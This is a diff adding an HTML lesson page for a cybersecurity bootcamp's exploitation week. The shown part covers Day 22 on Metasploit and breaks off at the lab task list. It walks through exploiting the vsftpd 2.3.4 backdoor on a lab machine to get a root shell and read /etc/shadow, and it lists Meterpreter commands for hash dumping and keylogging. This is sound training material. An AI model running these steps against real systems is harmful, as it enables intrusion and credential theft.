@@ -1,0 +1,1551 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Cybersecurity Bootcamp — Phase 2, Week 4</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=IBM+Plex+Sans:wght@300;400;500;600;700&family=Anton&display=swap');
+
+:root{
+  --bg:       #080609;
+  --surface:  #100c10;
+  --card:     #150f15;
+  --border:   #2a1a2a;
+  --accent:   #ff4500;   /* deep orange-red — signature war-room */
+  --amber:    #ffaa00;
+  --teal:     #00d4aa;
+  --blue:     #4488ff;
+  --purple:   #cc66ff;
+  --green:    #44ff88;
+  --text:     #c8b8c8;
+  --muted:    #4a3a4a;
+  --mono:     'IBM Plex Mono', monospace;
+  --sans:     'IBM Plex Sans', sans-serif;
+  --display:  'Anton', sans-serif;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:15px;line-height:1.7;min-height:100vh;}
+
+/* Signature: heat-map diagonal vignette — embers in top-left */
+body::before{
+  content:'';position:fixed;top:0;left:0;
+  width:60vw;height:60vh;
+  background:radial-gradient(ellipse at top left,rgba(255,69,0,0.07) 0%,transparent 70%);
+  pointer-events:none;z-index:0;
+}
+
+/* ── HEADER ── */
+header{
+  background:rgba(8,6,9,0.96);
+  border-bottom:2px solid var(--accent);
+  padding:0 2rem;position:sticky;top:0;z-index:200;
+}
+.hi{max-width:1150px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;height:56px;}
+.logo{font-family:var(--display);font-size:1.4rem;letter-spacing:0.1em;color:#fff;}
+.logo b{color:var(--accent);}
+.wbadge{
+  font-family:var(--mono);font-size:0.62rem;color:var(--amber);
+  border:1px solid rgba(255,170,0,0.4);padding:4px 14px;
+  letter-spacing:0.15em;background:rgba(255,170,0,0.06);
+}
+
+/* ── HERO ── */
+.hero{max-width:1150px;margin:0 auto;padding:3.5rem 2rem 2.5rem;position:relative;z-index:1;}
+.eyebrow{font-family:var(--mono);font-size:0.67rem;color:var(--muted);letter-spacing:0.28em;margin-bottom:0.9rem;}
+.hero h1{
+  font-family:var(--display);
+  font-size:clamp(3rem,9vw,7rem);
+  color:#fff;line-height:0.9;letter-spacing:0.03em;margin-bottom:1.2rem;
+}
+.hero h1 .fire{
+  color:var(--accent);
+  text-shadow:0 0 40px rgba(255,69,0,0.4);
+}
+.hsub{max-width:580px;color:var(--muted);font-size:0.92rem;line-height:1.75;margin-bottom:1.8rem;}
+.htags{display:flex;gap:0.5rem;flex-wrap:wrap;}
+.htag{font-family:var(--mono);font-size:0.64rem;padding:4px 12px;border-radius:1px;letter-spacing:0.07em;}
+.ta{background:rgba(255,69,0,0.1);color:var(--accent);border:1px solid rgba(255,69,0,0.3);}
+.tb{background:rgba(255,170,0,0.08);color:var(--amber);border:1px solid rgba(255,170,0,0.25);}
+.tc{background:rgba(0,212,170,0.07);color:var(--teal);border:1px solid rgba(0,212,170,0.2);}
+.td{background:rgba(68,136,255,0.08);color:var(--blue);border:1px solid rgba(68,136,255,0.2);}
+.te{background:rgba(204,102,255,0.08);color:var(--purple);border:1px solid rgba(204,102,255,0.2);}
+.tf{background:rgba(68,255,136,0.07);color:var(--green);border:1px solid rgba(68,255,136,0.2);}
+
+/* ── DAY NAV ── */
+.dnav{
+  max-width:1150px;margin:0 auto;padding:0 2rem;
+  display:flex;border-bottom:1px solid var(--border);
+  position:relative;z-index:1;overflow-x:auto;
+}
+.dtab{
+  font-family:var(--mono);font-size:0.68rem;
+  padding:13px 18px;border:none;background:transparent;
+  color:var(--muted);cursor:pointer;
+  border-bottom:2px solid transparent;
+  transition:all 0.16s;white-space:nowrap;letter-spacing:0.04em;
+}
+.dtab:hover{color:var(--text);}
+.dtab.on{color:var(--accent);border-bottom-color:var(--accent);}
+
+/* ── CONTENT ── */
+.wrap{max-width:1150px;margin:0 auto;padding:2.5rem 2rem;position:relative;z-index:1;}
+.pnl{display:none;}.pnl.on{display:block;}
+
+/* ── DAY HEADER ── */
+.dh{display:flex;gap:1.5rem;align-items:flex-start;margin-bottom:2rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border);}
+.dnum{font-family:var(--display);font-size:5.5rem;line-height:0.85;color:var(--accent);opacity:0.15;letter-spacing:-0.02em;min-width:110px;}
+.dinfo h2{font-family:var(--display);font-size:1.7rem;color:#fff;letter-spacing:0.04em;margin-bottom:0.35rem;}
+.dinfo p{color:var(--muted);font-size:0.85rem;}
+.stag{font-family:var(--mono);font-size:0.59rem;padding:2px 9px;margin-right:4px;border-radius:1px;letter-spacing:0.08em;}
+.sth{background:rgba(204,102,255,0.1);color:var(--purple);border:1px solid rgba(204,102,255,0.25);}
+.slb{background:rgba(68,255,136,0.08);color:var(--green);border:1px solid rgba(68,255,136,0.2);}
+.stl{background:rgba(0,212,170,0.07);color:var(--teal);border:1px solid rgba(0,212,170,0.2);}
+
+/* ── PROGRESS ── */
+.pb{margin-bottom:2rem;}
+.pbl{font-family:var(--mono);font-size:0.63rem;color:var(--muted);letter-spacing:0.15em;margin-bottom:5px;}
+.pbt{height:2px;background:var(--border);}
+.pbf{height:100%;background:linear-gradient(90deg,var(--accent),var(--amber));transition:width .5s;}
+
+/* ── CARD ── */
+.card{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1.5rem;margin-bottom:1.2rem;}
+.clbl{font-family:var(--mono);font-size:0.63rem;color:var(--amber);letter-spacing:0.2em;margin-bottom:0.9rem;display:flex;align-items:center;gap:0.6rem;}
+.clbl::before{content:'▸';color:var(--accent);}
+.card h3{font-size:1rem;font-weight:600;color:#e8d8e8;margin-bottom:0.5rem;}
+.card p{color:var(--text);font-size:0.87rem;margin-bottom:0.5rem;}
+.card p:last-child{margin-bottom:0;}
+
+/* ── TERMINAL ── */
+.trm{background:#02010a;border:1px solid var(--border);border-radius:3px;overflow:hidden;margin:1rem 0;}
+.tbar{background:#0d0710;padding:7px 14px;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--border);}
+.d{width:9px;height:9px;border-radius:50%;}
+.dr{background:#ff5f56;}.dy{background:#ffbd2e;}.dg{background:#27c93f;}
+.ttl{font-family:var(--mono);font-size:0.63rem;color:var(--muted);margin-left:6px;letter-spacing:0.1em;}
+.tbody{padding:1.2rem 1.4rem;font-family:var(--mono);font-size:0.77rem;line-height:2.1;color:#4a3060;}
+.pr{color:var(--green);}.cm{color:#d8c8e8;}.co{color:#2a1a3a;}
+.ha{color:var(--accent);}.hb{color:var(--amber);}.ht{color:var(--teal);}
+.hbl{color:var(--blue);}.hp{color:var(--purple);}.hg{color:var(--green);}
+
+/* ── TABLE ── */
+.tbl{width:100%;border-collapse:collapse;font-size:0.81rem;margin:1rem 0;}
+.tbl th{background:var(--surface);color:var(--teal);font-family:var(--mono);font-size:0.63rem;letter-spacing:0.14em;text-align:left;padding:9px 13px;border:1px solid var(--border);}
+.tbl td{padding:9px 13px;border:1px solid var(--border);color:var(--text);vertical-align:top;}
+.tbl tr:nth-child(even) td{background:rgba(255,255,255,0.015);}
+.tbl tr:hover td{background:rgba(255,69,0,0.03);}
+
+/* ── CALLOUT ── */
+.note{display:flex;gap:1rem;align-items:flex-start;padding:1rem 1.2rem;border-radius:3px;margin:1rem 0;font-size:0.85rem;}
+.ni{background:rgba(68,136,255,0.07);border:1px solid rgba(68,136,255,0.2);}
+.nw{background:rgba(255,170,0,0.07);border:1px solid rgba(255,170,0,0.22);}
+.nd{background:rgba(255,69,0,0.07);border:1px solid rgba(255,69,0,0.22);}
+.ng{background:rgba(68,255,136,0.06);border:1px solid rgba(68,255,136,0.18);}
+.nt{background:rgba(0,212,170,0.06);border:1px solid rgba(0,212,170,0.2);}
+.nico{font-size:1rem;line-height:1.6;flex-shrink:0;}
+.note p{color:var(--text);margin:0;}.note strong{color:#fff;}
+
+/* ── CHECKLIST ── */
+.ck{list-style:none;margin:0.8rem 0;}
+.ck li{display:flex;align-items:flex-start;gap:0.7rem;padding:0.42rem 0;font-size:0.85rem;color:var(--text);border-bottom:1px solid rgba(255,255,255,0.04);}
+.ck li:last-child{border-bottom:none;}
+.ck li::before{content:'›';color:var(--accent);flex-shrink:0;font-family:var(--mono);font-size:1.1rem;line-height:1.4;}
+
+/* ── QUIZ ── */
+.qb{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1.4rem;margin-bottom:1rem;}
+.qt{font-size:0.89rem;font-weight:600;color:#e8d8e8;margin-bottom:1rem;}
+.qopts{display:flex;flex-direction:column;gap:0.45rem;}
+.qo{display:flex;align-items:flex-start;gap:0.65rem;padding:0.6rem 1rem;border:1px solid var(--border);border-radius:2px;cursor:pointer;font-size:0.81rem;color:var(--text);transition:all 0.14s;user-select:none;}
+.qo:hover{border-color:var(--accent);color:#fff;background:rgba(255,69,0,0.05);}
+.qo.correct{border-color:var(--green);background:rgba(68,255,136,0.07);color:var(--green);}
+.qo.wrong{border-color:var(--accent);background:rgba(255,69,0,0.07);color:var(--accent);}
+.qk{font-family:var(--mono);font-size:0.67rem;color:var(--muted);min-width:16px;flex-shrink:0;padding-top:1px;}
+.qfb{margin-top:0.8rem;font-size:0.79rem;padding:0.6rem 1rem;border-radius:2px;display:none;}
+.qfb.show{display:block;}
+.qfb.correct{background:rgba(68,255,136,0.08);color:var(--green);border:1px solid rgba(68,255,136,0.22);}
+.qfb.wrong{background:rgba(255,69,0,0.08);color:var(--accent);border:1px solid rgba(255,69,0,0.22);}
+
+/* ── MSF WORKFLOW DIAGRAM ── */
+.msf-flow{display:flex;flex-direction:column;gap:0;border:1px solid var(--border);border-radius:3px;overflow:hidden;margin:1rem 0;}
+.msf-step{display:grid;grid-template-columns:48px 160px 1fr;border-bottom:1px solid var(--border);}
+.msf-step:last-child{border-bottom:none;}
+.ms-n{background:var(--accent);font-family:var(--display);font-size:1.2rem;color:#fff;display:flex;align-items:center;justify-content:center;}
+.ms-cmd{background:var(--surface);font-family:var(--mono);font-size:0.73rem;color:var(--amber);display:flex;align-items:center;padding:10px 14px;border-right:1px solid var(--border);border-left:1px solid var(--border);}
+.ms-desc{padding:10px 14px;font-size:0.82rem;color:var(--text);}
+
+/* ── VULN CARDS ── */
+.vcards{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:1rem;margin:1rem 0;}
+.vcard{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1.2rem;position:relative;overflow:hidden;}
+.vcard::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;}
+.vc-sqli::before{background:var(--accent);}
+.vc-xss::before{background:var(--amber);}
+.vc-csrf::before{background:var(--blue);}
+.vc-ssrf::before{background:var(--purple);}
+.vc-xxe::before{background:var(--teal);}
+.vc-idor::before{background:var(--green);}
+.vname{font-family:var(--mono);font-size:0.82rem;font-weight:700;margin-bottom:0.2rem;}
+.vcve{font-family:var(--mono);font-size:0.63rem;color:var(--muted);margin-bottom:0.6rem;}
+.vdesc{font-size:0.8rem;color:var(--muted);margin-bottom:0.7rem;line-height:1.55;}
+.vimpact{font-size:0.78rem;color:var(--text);padding:0.5rem 0.7rem;border-radius:2px;background:rgba(255,255,255,0.03);border:1px solid var(--border);}
+.vimpact strong{display:block;font-size:0.65rem;font-family:var(--mono);letter-spacing:0.1em;margin-bottom:2px;}
+
+/* ── PAYLOAD INTERACTIVE ── */
+.payload-demo{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1.5rem;margin:1rem 0;}
+.payload-demo h4{font-family:var(--display);font-size:1.1rem;color:var(--amber);letter-spacing:0.05em;margin-bottom:1rem;}
+.pd-tabs{display:flex;gap:0.4rem;margin-bottom:1rem;flex-wrap:wrap;}
+.pd-tab{font-family:var(--mono);font-size:0.7rem;padding:5px 14px;border:1px solid var(--border);border-radius:2px;cursor:pointer;color:var(--muted);transition:all 0.14s;}
+.pd-tab:hover{border-color:var(--amber);color:var(--amber);}
+.pd-tab.on{border-color:var(--amber);color:var(--amber);background:rgba(255,170,0,0.08);}
+.pd-content{display:none;}.pd-content.on{display:block;}
+.pd-payload{
+  font-family:var(--mono);font-size:0.78rem;
+  background:#02010a;border:1px solid var(--border);
+  border-left:3px solid var(--accent);
+  border-radius:2px;padding:1rem 1.2rem;
+  color:var(--accent);white-space:pre-wrap;
+  word-break:break-all;line-height:1.8;
+}
+.pd-explain{margin-top:0.8rem;font-size:0.82rem;color:var(--muted);line-height:1.65;}
+
+/* ── PASSWORD ATTACK METER ── */
+.crack-meter{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1.5rem;margin:1rem 0;}
+.crack-meter h4{font-family:var(--display);font-size:1.1rem;color:var(--amber);letter-spacing:0.05em;margin-bottom:1.2rem;}
+.crack-rows{display:flex;flex-direction:column;gap:0.8rem;}
+.crack-row{display:grid;grid-template-columns:160px 1fr 100px;gap:0.8rem;align-items:center;}
+.cr-label{font-family:var(--mono);font-size:0.72rem;color:var(--text);}
+.cr-bar-wrap{height:8px;background:var(--border);border-radius:2px;overflow:hidden;}
+.cr-bar{height:100%;border-radius:2px;transition:width 0.8s ease;}
+.bar-instant{background:var(--accent);width:100%;}
+.bar-sec{background:#ff7700;width:90%;}
+.bar-min{background:var(--amber);width:70%;}
+.bar-hrs{background:#aaaa00;width:50%;}
+.bar-days{background:var(--teal);width:30%;}
+.bar-yrs{background:var(--blue);width:10%;}
+.bar-imp{background:var(--green);width:2%;}
+.cr-time{font-family:var(--mono);font-size:0.7rem;text-align:right;}
+.t-instant{color:var(--accent);}
+.t-sec{color:#ff7700;}
+.t-min{color:var(--amber);}
+.t-hrs{color:#aaaa00;}
+.t-days{color:var(--teal);}
+.t-yrs{color:var(--blue);}
+.t-imp{color:var(--green);}
+
+/* ── SECTION LABEL ── */
+.slbl{font-family:var(--mono);font-size:0.63rem;color:var(--muted);letter-spacing:0.25em;margin:2rem 0 0.8rem;}
+
+/* ── TWO COL ── */
+.two{display:grid;grid-template-columns:1fr 1fr;gap:1rem;}
+@media(max-width:700px){.two{grid-template-columns:1fr;}.dnum{font-size:3.5rem;min-width:80px;}.crack-row{grid-template-columns:120px 1fr 80px;}}
+
+/* ── HELPERS ── */
+.hl{color:var(--accent);font-weight:600;}
+.ha2{color:var(--amber);font-weight:600;}
+.ht2{color:var(--teal);font-weight:600;}
+.hb2{color:var(--blue);font-weight:600;}
+.hg2{color:var(--green);font-weight:600;}
+.hp2{color:var(--purple);font-weight:600;}
+
+/* ── METERPRETER CHEAT ── */
+.mtr-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:0.7rem;margin:1rem 0;}
+.mtr-card{background:var(--card);border:1px solid var(--border);border-radius:2px;padding:0.9rem 1rem;}
+.mtr-cmd{font-family:var(--mono);font-size:0.78rem;font-weight:700;color:var(--teal);margin-bottom:0.3rem;}
+.mtr-desc{font-size:0.77rem;color:var(--muted);}
+
+/* ── OWASP RANK ── */
+.owasp-list{display:flex;flex-direction:column;gap:0.5rem;margin:1rem 0;}
+.ow-item{display:grid;grid-template-columns:50px 1fr auto;gap:0.8rem;align-items:center;background:var(--card);border:1px solid var(--border);border-radius:2px;padding:0.8rem 1rem;}
+.ow-rank{font-family:var(--display);font-size:1.5rem;color:var(--accent);opacity:0.5;line-height:1;}
+.ow-name{font-size:0.87rem;font-weight:600;color:#e8d8e8;}
+.ow-sub{font-size:0.74rem;color:var(--muted);}
+.ow-sev{font-family:var(--mono);font-size:0.65rem;padding:3px 10px;border-radius:2px;}
+.sev-c{background:rgba(255,69,0,0.12);color:var(--accent);border:1px solid rgba(255,69,0,0.3);}
+.sev-h{background:rgba(255,170,0,0.1);color:var(--amber);border:1px solid rgba(255,170,0,0.25);}
+.sev-m{background:rgba(0,212,170,0.08);color:var(--teal);border:1px solid rgba(0,212,170,0.2);}
+
+/* ── FOOTER ── */
+footer{border-top:1px solid var(--border);padding:1.5rem 2rem;text-align:center;font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.1em;max-width:1150px;margin:2rem auto 0;position:relative;z-index:1;}
+</style>
+<link rel="stylesheet" href="../css/shared.css"/>
+</head>
+<body>
+<nav class="breadcrumb" style="background:var(--surface,#090c12);border-bottom-color:var(--border,#141b26);color:var(--muted,#253040);">
+  <a href="../index.html" style="color:var(--accent,#3b82f6);">LESSON HUB</a>
+  <span>/</span>
+  <span style="color:var(--text,#b0c0d8);">Phase 2</span>
+  <span>/</span>
+  <span style="color:#fff;">Week 4</span>
+</nav>
+
+<header>
+  <div class="hi">
+    <div class="logo">CYBER<b>BOOT</b>CAMP</div>
+    <div class="wbadge">PHASE 2 · WEEK 4 · EXPLOITATION FUNDAMENTALS</div>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="eyebrow">// PHASE 2 — ENUMERATION & EXPLOITATION → WEEK 4 OF 4</div>
+  <h1>BREAK<br><span class="fire">EVERYTHING.</span></h1>
+  <p class="hsub">Seven days of hands-on exploitation — Metasploit framework, your first real shell, SQL injection at depth, XSS and CSRF attacks, SSRF and XXE, OWASP Top 10, and password cracking with Hashcat. Phase 2 ends with a full HackTheBox machine walkthrough.</p>
+  <div class="htags">
+    <span class="htag ta">Metasploit</span>
+    <span class="htag tb">Meterpreter</span>
+    <span class="htag tc">SQL Injection</span>
+    <span class="htag td">XSS / CSRF</span>
+    <span class="htag te">SSRF / XXE</span>
+    <span class="htag tf">Hashcat / John</span>
+    <span class="htag ta">OWASP Top 10</span>
+    <span class="htag tb">HackTheBox</span>
+  </div>
+</div>
+
+<div class="dnav">
+  <button class="dtab on" onclick="show(0)">Day 22 — Metasploit</button>
+  <button class="dtab" onclick="show(1)">Day 23 — SQL Injection</button>
+  <button class="dtab" onclick="show(2)">Day 24 — XSS</button>
+  <button class="dtab" onclick="show(3)">Day 25 — CSRF / SSRF / XXE</button>
+  <button class="dtab" onclick="show(4)">Day 26 — IDOR & Access Control</button>
+  <button class="dtab" onclick="show(5)">Day 27 — Password Attacks</button>
+  <button class="dtab" onclick="show(6)">Day 28 — CTF + Phase 2 Capstone</button>
+</div>
+
+<div class="wrap">
+
+<!-- ═════════════════ DAY 22 ═════════════════ -->
+<div class="pnl on" id="p0">
+  <div class="dh">
+    <div class="dnum">22</div>
+    <div class="dinfo">
+      <h2>METASPLOIT FRAMEWORK</h2>
+      <p><span class="stag stl">TOOL</span><span class="stag slb">LAB</span> msfconsole · Exploits · Payloads · Meterpreter · First Shell</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 4 PROGRESS — DAY 22 OF 28</div><div class="pbt"><div class="pbf" style="width:78%"></div></div></div>
+
+  <div class="note ni">
+    <div class="nico">💀</div>
+    <p><strong>Today you get your first real shell.</strong> Metasploit Framework is the world's most widely used exploitation framework — trusted by pentesters, red teams, and (unfortunately) attackers worldwide. It's a library of 2,300+ exploits, 1,000+ payloads, and powerful post-exploitation tools. After today, you'll go from "I found a vulnerability" to "I have a shell and full control."</p>
+  </div>
+
+  <div class="slbl">// 22.1 — METASPLOIT ARCHITECTURE</div>
+  <table class="tbl">
+    <tr><th>COMPONENT</th><th>WHAT IT IS</th><th>EXAMPLE</th></tr>
+    <tr><td><span class="hl">Exploit</span></td><td>The code that takes advantage of a vulnerability to gain execution</td><td><code>exploit/unix/ftp/vsftpd_234_backdoor</code></td></tr>
+    <tr><td><span class="hl">Payload</span></td><td>The code that runs AFTER the exploit succeeds — what you actually do with access</td><td><code>payload/cmd/unix/interact</code>, <code>windows/meterpreter/reverse_tcp</code></td></tr>
+    <tr><td><span class="ha2">Auxiliary</span></td><td>Modules that don't exploit — scanners, fuzzers, brute-forcers, denial of service</td><td><code>auxiliary/scanner/smb/smb_ms17_010</code></td></tr>
+    <tr><td><span class="ha2">Post</span></td><td>Post-exploitation modules — run AFTER you have a shell to escalate, persist, pivot</td><td><code>post/multi/recon/local_exploit_suggester</code></td></tr>
+    <tr><td><span class="ht2">Encoder</span></td><td>Transform payloads to evade antivirus signature detection</td><td><code>encoder/x86/shikata_ga_nai</code></td></tr>
+    <tr><td><span class="ht2">Meterpreter</span></td><td>Advanced in-memory payload — lives in RAM, never touches disk, hard to detect</td><td>Full filesystem, webcam, keylogger, pivoting</td></tr>
+  </table>
+
+  <div class="slbl">// 22.2 — msfconsole COMPLETE WORKFLOW</div>
+
+  <div class="msf-flow">
+    <div class="msf-step">
+      <div class="ms-n">1</div>
+      <div class="ms-cmd">msfconsole</div>
+      <div class="ms-desc">Launch Metasploit. The <code>msf6 ></code> prompt appears. Everything happens here.</div>
+    </div>
+    <div class="msf-step">
+      <div class="ms-n">2</div>
+      <div class="ms-cmd">search vsftpd</div>
+      <div class="ms-desc">Search the module library. Find the exploit matching the vulnerability nmap found in Week 3.</div>
+    </div>
+    <div class="msf-step">
+      <div class="ms-n">3</div>
+      <div class="ms-cmd">use 0</div>
+      <div class="ms-desc">Select module by index number. Prompt changes to <code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) ></code></div>
+    </div>
+    <div class="msf-step">
+      <div class="ms-n">4</div>
+      <div class="ms-cmd">info</div>
+      <div class="ms-desc">Read the module details — vulnerability description, CVE, required options, reliability rating. Always read this before using a module.</div>
+    </div>
+    <div class="msf-step">
+      <div class="ms-n">5</div>
+      <div class="ms-cmd">show options</div>
+      <div class="ms-desc">See required and optional parameters. RHOSTS (target IP) is always required. LHOST/LPORT needed for reverse shells.</div>
+    </div>
+    <div class="msf-step">
+      <div class="ms-n">6</div>
+      <div class="ms-cmd">set RHOSTS &lt;IP&gt;</div>
+      <div class="ms-desc">Set the target. Always verify you have the right IP — mistakes here could hit unintended systems.</div>
+    </div>
+    <div class="msf-step">
+      <div class="ms-n">7</div>
+      <div class="ms-cmd">run / exploit</div>
+      <div class="ms-desc">Execute the exploit. Watch the output — success gives you a shell session. Failure gives error details for troubleshooting.</div>
+    </div>
+    <div class="msf-step">
+      <div class="ms-n">8</div>
+      <div class="ms-cmd">sessions -l</div>
+      <div class="ms-desc">List all open sessions. Multiple targets? Multiple sessions. Switch between them: <code>sessions -i 1</code></div>
+    </div>
+  </div>
+
+  <div class="slbl">// 22.3 — YOUR FIRST REAL EXPLOIT: vsftpd 2.3.4 BACKDOOR</div>
+  <div class="note nd">
+    <div class="nico">🎯</div>
+    <p><strong>This is real.</strong> CVE-2011-2523 is an actual backdoor that was secretly inserted into the vsftpd 2.3.4 source code distribution in 2011. When a username containing a smiley face ":)" is sent to the FTP server, it opens a root shell on port 6200. Metasploitable 2 runs this exact version. You are about to exploit a real CVE against a real vulnerable service.</p>
+  </div>
+
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">EXPLOITING vsftpd 2.3.4 BACKDOOR — FULL SESSION</div></div>
+    <div class="tbody"><span class="pr">kali$</span> <span class="cm">msfconsole -q</span>
+<span class="hg">msf6 ></span> <span class="cm">search vsftpd</span>
+
+<span class="co">Matching Modules
+================</span>
+<span class="ht">   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution</span>
+
+<span class="hg">msf6 ></span> <span class="cm">use 0</span>
+<span class="hg">msf6 exploit(unix/ftp/vsftpd_234_backdoor) ></span> <span class="cm">set RHOSTS 192.168.56.101</span>
+<span class="ht">RHOSTS => 192.168.56.101</span>
+<span class="hg">msf6 exploit(unix/ftp/vsftpd_234_backdoor) ></span> <span class="cm">run</span>
+
+<span class="hb">[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)</span>
+<span class="hb">[*] 192.168.56.101:21 - USER: 331 Please specify the password.</span>
+<span class="ha">[+] 192.168.56.101:21 - Backdoor service has been spawned, handling...</span>
+<span class="ha">[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)</span>
+<span class="hg">[*] Found shell.</span>
+<span class="hg">[*] Command shell session 1 opened (192.168.56.100:51234 -> 192.168.56.101:6200)</span>
+
+<span class="cm">id</span>
+<span class="ht">uid=0(root) gid=0(root) groups=0(root)</span>
+
+<span class="cm">whoami</span>
+<span class="ht">root</span>
+
+<span class="cm">hostname</span>
+<span class="ht">metasploitable</span>
+
+<span class="cm">cat /etc/shadow</span>
+<span class="ht">root:$1$nUP0OmFM$Hc6sSkyq3q0oVnwMfCvGY/:13831:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/nt1it8BBFfa15LEENX1:14684:0:99999:7:::
+postgres:$1$Mq2GxJOX$wFU8NWvxqXXw5RNJBW/al.:14684:0:99999:7:::</span>
+
+<span class="co"># YOU ARE ROOT. Full system compromise in 4 commands.
+# The shadow file contains password hashes for ALL users — crack them in Day 27</span>
+
+<span class="cm">cat /root/proof.txt</span>   <span class="co"># In CTFs, root flag is usually here</span>
+<span class="ha">THM{vsftpd_r00t_pwned}</span></div>
+  </div>
+
+  <div class="slbl">// 22.4 — STAGED vs STAGELESS PAYLOADS</div>
+  <table class="tbl">
+    <tr><th>TYPE</th><th>NOTATION</th><th>HOW IT WORKS</th><th>WHEN TO USE</th></tr>
+    <tr>
+      <td><span class="hl">Staged</span></td>
+      <td><code>windows/meterpreter/reverse_tcp</code><br><small>(slash between meterpreter and reverse_tcp)</small></td>
+      <td>Small first stage ("stager") runs on target, connects back to Metasploit, downloads the full payload in memory. Two-stage delivery.</td>
+      <td>When payload size is constrained (buffer overflows with limited space). Requires stable C2 connection.</td>
+    </tr>
+    <tr>
+      <td><span class="ha2">Stageless</span></td>
+      <td><code>windows/meterpreter_reverse_tcp</code><br><small>(underscore — no slash)</small></td>
+      <td>Single self-contained payload. Everything is included. Larger file but works even if outbound connection to Metasploit drops after initial execution.</td>
+      <td>When reliability matters more than size. Better for unstable connections.</td>
+    </tr>
+  </table>
+
+  <div class="slbl">// 22.5 — METERPRETER: YOUR POST-EXPLOITATION SWISS ARMY KNIFE</div>
+  <div class="mtr-grid">
+    <div class="mtr-card"><div class="mtr-cmd">sysinfo</div><div class="mtr-desc">OS name, computer name, architecture, domain. First command after shell.</div></div>
+    <div class="mtr-card"><div class="mtr-cmd">getuid</div><div class="mtr-desc">Current user context. Check if you're SYSTEM/root or need privesc.</div></div>
+    <div class="mtr-card"><div class="mtr-cmd">getsystem</div><div class="mtr-desc">Attempt automatic Windows privilege escalation to SYSTEM. Tries multiple techniques.</div></div>
+    <div class="mtr-card"><div class="mtr-cmd">hashdump</div><div class="mtr-desc">Dump local Windows SAM database — all local user password hashes. Crack offline with Hashcat.</div></div>
+    <div class="mtr-card"><div class="mtr-cmd">ps</div><div class="mtr-desc">List all running processes with PIDs. Look for SYSTEM-owned processes to migrate into.</div></div>
+    <div class="mtr-card"><div class="mtr-cmd">migrate &lt;PID&gt;</div><div class="mtr-desc">Move Meterpreter into another process. Migrate to a stable SYSTEM process for persistence.</div></div>
+    <div class="mtr-card"><div class="mtr-cmd">upload / download</div><div class="mtr-desc">Transfer files to/from the target. Upload tools, download loot (databases, config files).</div></div>
+    <div class="mtr-card"><div class="mtr-cmd">shell</div><div class="mtr-desc">Drop into a native OS shell (cmd.exe or /bin/bash). Run standard commands.</div></div>
+    <div class="mtr-card"><div class="mtr-cmd">run post/...</div><div class="mtr-desc">Run post-exploitation modules: local_exploit_suggester, credential_collector, arp_scanner for pivoting.</div></div>
+    <div class="mtr-card"><div class="mtr-cmd">keyscan_start</div><div class="mtr-desc">Start keylogger. Capture everything typed on the target machine.</div></div>
+    <div class="mtr-card"><div class="mtr-cmd">screenshot</div><div class="mtr-desc">Capture the current desktop screenshot. See what the user sees.</div></div>
+    <div class="mtr-card"><div class="mtr-cmd">background / Ctrl+Z</div><div class="mtr-desc">Background session to return to msfconsole. Session stays open.</div></div>
+  </div>
+
+  <div class="slbl">// DAY 22 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You get a Meterpreter shell on a Windows machine. <code>getuid</code> shows <code>NT AUTHORITY\NETWORK SERVICE</code>. You want to dump password hashes with <code>hashdump</code> but it fails. What is the correct sequence to get it working?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Rerunning the exploit gets you another NETWORK SERVICE shell — same problem. The issue is privileges, not the session.')"><span class="qk">A</span> Background session and re-exploit to get a new session with higher privileges</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! NETWORK SERVICE has very limited privileges — it cannot access the SAM database. The sequence: (1) <code>ps</code> — list processes and find one running as SYSTEM (e.g., lsass.exe, services.exe, winlogon.exe). (2) <code>migrate &lt;PID&gt;</code> — move Meterpreter into that SYSTEM process. (3) <code>getuid</code> — now shows NT AUTHORITY\\SYSTEM. (4) <code>hashdump</code> — now succeeds and dumps all local account hashes. Alternatively, try <code>getsystem</code> first — it attempts automatic privilege escalation and if successful, migration to SYSTEM is handled automatically.')"><span class="qk">B</span> <code>ps</code> to find a SYSTEM-owned process, <code>migrate</code> into it, then retry <code>hashdump</code></div>
+      <div class="qo" onclick="qa(this,'wrong','load kiwi (Mimikatz integration) requires SYSTEM privileges too — same problem. You need to migrate to SYSTEM first before any privileged Meterpreter module works.')"><span class="qk">C</span> Run <code>load kiwi</code> to use Mimikatz — it bypasses the privilege requirement</div>
+      <div class="qo" onclick="qa(this,'wrong','hashdump doesn\'t have a -force flag. There is no flag that bypasses Windows access control on the SAM database.')"><span class="qk">D</span> Use <code>hashdump -force</code> flag to override the permission requirement</div>
+    </div>
+    <div class="qfb" id="q0"></div>
+  </div>
+
+  <div class="slbl">// DAY 22 — LAB</div>
+  <div class="card">
+    <div class="clbl">LAB TASKS</div>
+    <ul class="ck">
